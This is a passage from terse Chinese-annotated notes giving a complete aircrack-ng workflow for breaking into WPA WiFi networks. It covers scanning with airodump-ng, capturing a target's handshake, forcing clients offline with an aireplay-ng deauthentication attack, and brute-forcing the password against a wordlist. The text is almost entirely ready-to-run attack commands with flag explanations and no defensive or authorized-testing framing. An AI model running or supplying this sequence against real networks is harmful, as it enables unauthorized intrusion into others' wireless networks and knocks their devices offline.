...
airodump-ng wlan0mon   # 扫描周边WiFi信号 + 停止命令Ctrl+C

# 被动等待抓包命令 # 保持抓包窗口一直开着 + 停止命令Ctrl+C
airodump-ng --bssid *:*:*:*:*:* --channel 9 --write ./handshake wlan0mon
   # airodump参数: --bssid “MAC地址”  --channel -c “CH频段”
   # airodump输出: “bssid无线网卡MAC地址” + “STATION客户端”

# 主动ACK循环攻击 # 等一会儿上面窗口中出现握手包: WPA handshake: ******** # 然后停止抓包
aireplay-ng -a *:*:*:*:*:* -c *:* -0 10 wlan0mon
   # aireplay参数: -a “bssid地址” -c “下线STATION客户端” -0 “通知设备断开并攻击10次”

# 暴力破解密码
aircrack-ng -b *:*:*:*:*:* -w ./password.txt ./handshake*.cap
